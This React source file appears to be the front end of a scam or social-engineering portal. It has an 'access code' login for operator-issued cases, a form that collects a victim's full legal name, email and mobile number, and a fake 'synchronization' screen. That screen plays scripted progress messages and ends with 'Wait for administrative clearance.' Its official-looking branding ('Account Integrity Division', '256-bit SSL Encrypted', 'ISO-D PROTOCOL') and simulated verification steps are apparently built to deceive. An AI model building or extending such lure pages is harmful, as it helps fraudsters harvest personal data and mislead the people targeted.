import { useState } from "react";
import { motion } from "framer-motion";
import { ShieldCheck, Lock, Key, User, Mail, Phone, Shield } from "lucide-react";
import { Button } from "@/components/ui/button";
import { Card, CardContent, CardFooter, CardHeader, CardTitle } from "@/components/ui/card";
import { Input } from "@/components/ui/input";
import { useToast } from "@/hooks/use-toast";
import { usePortal, Case, ViewState } from "./PortalContext";

export function LoginView() {
  const { setCurrentCase, setAccessCode, setViewState } = usePortal();
  const [localAccessCode, setLocalAccessCode] = useState("");
  const { toast } = useToast();

  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault();
    
    try {
      const response = await fetch(`/api/cases/access/${localAccessCode}`);
      
      if (response.ok) {
        const foundCase: Case = await response.json();
        setCurrentCase(foundCase);
        setAccessCode(localAccessCode);
        
        const landingPage = (foundCase.landingPage || 'dashboard') as ViewState;
        if (foundCase.status === 'active') setViewState(landingPage);
        else if (foundCase.status === 'syncing') setViewState('sync');
        else if (foundCase.status === 'completed') setViewState(landingPage);
        else setViewState('register');
        
        toast({
          title: "Identity Verified",
          description: "Secure session established.",
          className: "bg-green-50 border-green-200 text-green-900",
        });
      } else {
        toast({
          variant: "destructive",
          title: "Access Denied",
          description: "Invalid clearance code provided.",
        });
      }
    } catch {
      toast({
        variant: "destructive",
        title: "Connection Error",
        description: "Unable to verify credentials.",
      });
    }
  };

  return (
    <div className="min-h-screen bg-slate-900 flex items-center justify-center p-4 font-sans">
      <motion.div initial={{ opacity: 0, scale: 0.95 }} animate={{ opacity: 1, scale: 1 }} className="max-w-md w-full">
        <div className="text-center mb-8">
          <div className="w-16 h-16 mx-auto mb-4 rounded-full bg-[#004182]/20 flex items-center justify-center" data-testid="img-logo">
            <Shield className="h-10 w-10 text-[#004182]" />
          </div>
          <h1 className="text-xl font-bold text-white tracking-wider">SECURE GATEWAY ACCESS</h1>
          <p className="text-slate-400 text-xs uppercase tracking-widest mt-1">Account Integrity Division</p>
        </div>
        <Card className="bg-slate-950 border-slate-800 shadow-2xl">
          <CardHeader>
            <CardTitle className="text-white text-center flex items-center justify-center gap-2">
              <Lock className="w-4 h-4 text-blue-500" /> Verification Required
            </CardTitle>
          </CardHeader>
          <CardContent>
            <form onSubmit={handleLogin} className="space-y-4">
              <div className="space-y-2">
                <label className="text-xs font-medium text-slate-400 uppercase">Compliance Clearance Reference</label>
                <div className="relative">
                  <Key className="absolute left-3 top-2.5 h-4 w-4 text-slate-500" />
                  <Input 
                    type="password" 
                    placeholder="Enter Access Code" 
                    className="pl-9 bg-slate-900 border-slate-800 text-white placeholder:text-slate-600 focus:ring-blue-500"
                    value={localAccessCode}
                    onChange={(e) => setLocalAccessCode(e.target.value)}
                    data-testid="input-access-code"
                  />
                </div>
              </div>
              <Button type="submit" className="w-full bg-blue-600 hover:bg-blue-700 text-white" data-testid="button-login">
                Verify Identity
              </Button>
            </form>
          </CardContent>
          <CardFooter className="border-t border-slate-800 pt-4 pb-6 flex justify-center">
            <div className="flex items-center gap-2 text-[10px] text-slate-500 uppercase tracking-wider">
              <ShieldCheck className="w-3 h-3" /> 256-bit SSL Encrypted
            </div>
          </CardFooter>
        </Card>
      </motion.div>
    </div>
  );
}

export function RegisterView() {
  const { currentCase, setCurrentCase, setViewState } = usePortal();
  const [regName, setRegName] = useState("");
  const [regEmail, setRegEmail] = useState("");
  const [regMobile, setRegMobile] = useState("");
  const [syncProgress, setSyncProgress] = useState(0);
  const { toast } = useToast();

  const startSyncSimulation = () => {
    const steps = [
      { progress: 15, text: "Initializing secure handshake..." },
      { progress: 30, text: "Verifying identity certificates..." },
      { progress: 45, text: "Synchronizing with compliance database..." },
      { progress: 60, text: "Validating account integrity..." },
      { progress: 75, text: "Establishing secure session..." },
      { progress: 90, text: "Finalizing synchronization..." },
    ];
    
    let index = 0;
    const interval = setInterval(() => {
      if (index < steps.length) {
        setSyncProgress(steps[index].progress);
        index++;
      } else {
        clearInterval(interval);
      }
    }, 1500);
  };

  const handleRegister = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!currentCase) return;

    try {
      const response = await fetch(`/api/cases/${currentCase.id}`, {
        method: 'PATCH',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          status: 'syncing',
          userName: regName,
          userEmail: regEmail,
          userMobile: regMobile
        })
      });

      if (response.ok) {
        const updatedCase = await response.json();
        setCurrentCase(updatedCase);
        setViewState('sync');
        startSyncSimulation();
      } else {
        toast({
          variant: "destructive",
          title: "Registration Failed",
          description: "Unable to complete registration.",
        });
      }
    } catch {
      toast({
        variant: "destructive",
        title: "Connection Error",
        description: "Unable to save registration.",
      });
    }
  };

  return (
    <div className="min-h-screen bg-slate-900 flex items-center justify-center p-4 font-sans">
      <motion.div initial={{ opacity: 0, x: 20 }} animate={{ opacity: 1, x: 0 }} className="max-w-md w-full">
        <Card className="bg-slate-950 border-slate-800 shadow-2xl">
          <CardHeader>
            <CardTitle className="text-white">Identity Verification</CardTitle>
            <p className="text-slate-400 text-sm mt-1">Please confirm your contact details for the secure ledger.</p>
          </CardHeader>
          <CardContent>
            <form onSubmit={handleRegister} className="space-y-4">
              <div className="space-y-2">
                <label className="text-xs font-medium text-slate-400 uppercase">Full Legal Name</label>
                <div className="relative">
                  <User className="absolute left-3 top-2.5 h-4 w-4 text-slate-500" />
                  <Input 
                    required 
                    value={regName} 
                    onChange={e => setRegName(e.target.value)} 
                    className="pl-9 bg-slate-900 border-slate-800 text-white" 
                    placeholder="Your full legal name" 
                    data-testid="input-name" 
                  />
                </div>
              </div>
              <div className="space-y-2">
                <label className="text-xs font-medium text-slate-400 uppercase">Email Address</label>
                <div className="relative">
                  <Mail className="absolute left-3 top-2.5 h-4 w-4 text-slate-500" />
                  <Input 
                    required 
                    type="email" 
                    value={regEmail} 
                    onChange={e => setRegEmail(e.target.value)} 
                    className="pl-9 bg-slate-900 border-slate-800 text-white" 
                    placeholder="name@example.com" 
                    data-testid="input-email" 
                  />
                </div>
              </div>
              <div className="space-y-2">
                <label className="text-xs font-medium text-slate-400 uppercase">Mobile Number</label>
                <div className="relative">
                  <Phone className="absolute left-3 top-2.5 h-4 w-4 text-slate-500" />
                  <Input 
                    required 
                    type="tel" 
                    value={regMobile} 
                    onChange={e => setRegMobile(e.target.value)} 
                    className="pl-9 bg-slate-900 border-slate-800 text-white" 
                    placeholder="Your contact number" 
                    data-testid="input-mobile" 
                  />
                </div>
              </div>
              <Button type="submit" className="w-full bg-blue-600 hover:bg-blue-700 text-white mt-4" data-testid="button-register">
                Proceed to Secure Synchronization
              </Button>
            </form>
          </CardContent>
        </Card>
      </motion.div>
    </div>
  );
}

interface SyncViewProps {
  syncProgress?: number;
  syncStatusText?: string;
}

export function SyncView({ syncProgress = 75, syncStatusText = "Establishing secure connection..." }: SyncViewProps) {
  return (
    <div className="min-h-screen bg-slate-900 flex items-center justify-center p-4 font-sans">
      <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }} className="max-w-md w-full text-center">
        <div className="mb-8 relative">
          <div className="w-24 h-24 rounded-full border-4 border-blue-500/30 border-t-blue-500 animate-spin mx-auto"></div>
          <div className="absolute inset-0 flex items-center justify-center">
            <Lock className="w-8 h-8 text-blue-500" />
          </div>
        </div>
        
        <h2 className="text-2xl font-bold text-white mb-2">Synchronizing Account</h2>
        <p className="text-slate-400 text-sm mb-8 h-6">{syncStatusText}</p>
        
        <div className="bg-slate-800 rounded-full h-2 mb-2 overflow-hidden">
          <motion.div 
            className="h-full bg-blue-500" 
            initial={{ width: "0%" }}
            animate={{ width: `${syncProgress}%` }}
            transition={{ duration: 0.5 }}
          />
        </div>
        <div className="flex justify-between text-xs text-slate-500 font-mono">
          <span>ISO-D PROTOCOL</span>
          <span>{syncProgress}%</span>
        </div>

        {syncProgress >= 90 && (
          <div className="mt-8 p-4 bg-amber-500/10 border border-amber-500/20 rounded text-amber-400 text-xs animate-pulse">
            Wait for administrative clearance...
          </div>
        )}
      </motion.div>
    </div>
  );
}
